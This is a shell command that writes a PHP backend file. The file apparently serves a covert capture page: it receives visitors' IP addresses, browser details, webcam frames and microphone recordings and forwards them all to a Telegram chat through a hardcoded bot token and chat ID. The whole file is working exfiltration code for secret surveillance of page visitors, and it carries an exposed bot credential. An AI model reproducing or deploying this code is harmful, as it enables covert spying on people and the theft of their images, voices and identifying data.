cat > backend.php << 'EOF'
<?php
$botToken = '8455872800:AAEfQOcT6c1Bb-bJA9WBBxpKrnF1wM8QcUE';   // replace later
$chatId   = '5904164831';     // replace later

function sendToTelegram($message) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML'];
    $options = ['http' => ['header' => "Content-type: application/x-www-form-urlencoded\r\n", 'method' => 'POST', 'content' => http_build_query($data)]];
    file_get_contents($url, false, stream_context_create($options));
}

function sendMedia($type, $data, $caption = '') {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/send$type";
    $boundary = uniqid();
    $delimiter = "-------------$boundary";
    $postData = "--$delimiter\r\n";
    $postData .= "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n$chatId\r\n";
    $postData .= "--$delimiter\r\n";
    $postData .= "Content-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n";
    $postData .= "--$delimiter\r\n";
    $postData .= "Content-Disposition: form-data; name=\"$type\"; filename=\"file.jpg\"\r\n";
    $postData .= "Content-Type: image/jpeg\r\n\r\n";
    $postData .= base64_decode(str_replace('data:image/jpeg;base64,', '', $data)) . "\r\n";
    $postData .= "--$delimiter--\r\n";
    $options = ['http' => ['header' => "Content-Type: multipart/form-data; boundary=$delimiter\r\n", 'method' => 'POST', 'content' => $postData]];
    file_get_contents($url, false, stream_context_create($options));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');

    if ($action === 'info') {
        $userAgent = $_POST['userAgent'] ?? '';
        $language = $_POST['language'] ?? '';
        $visitTime = $_POST['time'] ?? '';
        sendToTelegram("🌐 VISIT\nUser Agent: $userAgent\nLanguage: $language\nTime: $visitTime\nIP: $ip");
        echo json_encode(['status' => 'success']);
    } elseif ($action === 'frame') {
        $frame = $_POST['frame'] ?? '';
        if ($frame) sendMedia('photo', $frame, "📸 Frame\nIP: $ip\nTime: $time");
        echo json_encode(['status' => 'success']);
    } elseif ($action === 'audio') {
        $audio = $_POST['audio'] ?? '';
        if ($audio) {
            $url = "https://api.telegram.org/bot$botToken/sendVoice";
            $boundary = uniqid();
            $delimiter = "-------------$boundary";
            $postData = "--$delimiter\r\n";
            $postData .= "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n$chatId\r\n";
            $postData .= "--$delimiter\r\n";
            $postData .= "Content-Disposition: form-data; name=\"caption\"\r\n\r\n🎤 Audio\nIP: $ip\nTime: $time\r\n";
            $postData .= "--$delimiter\r\n";
            $postData .= "Content-Disposition: form-data; name=\"voice\"; filename=\"audio.ogg\"\r\n";
            $postData .= "Content-Type: audio/ogg\r\n\r\n";
            $postData .= base64_decode(str_replace('data:audio/webm;base64,', '', $audio)) . "\r\n";
            $postData .= "--$delimiter--\r\n";
            $options = ['http' => ['header' => "Content-Type: multipart/form-data; boundary=$delimiter\r\n", 'method' => 'POST', 'content' => $postData]];
            file_get_contents($url, false, stream_context_create($options));
        }
        echo json_encode(['status' => 'success']);
    }
}
?>
EOF
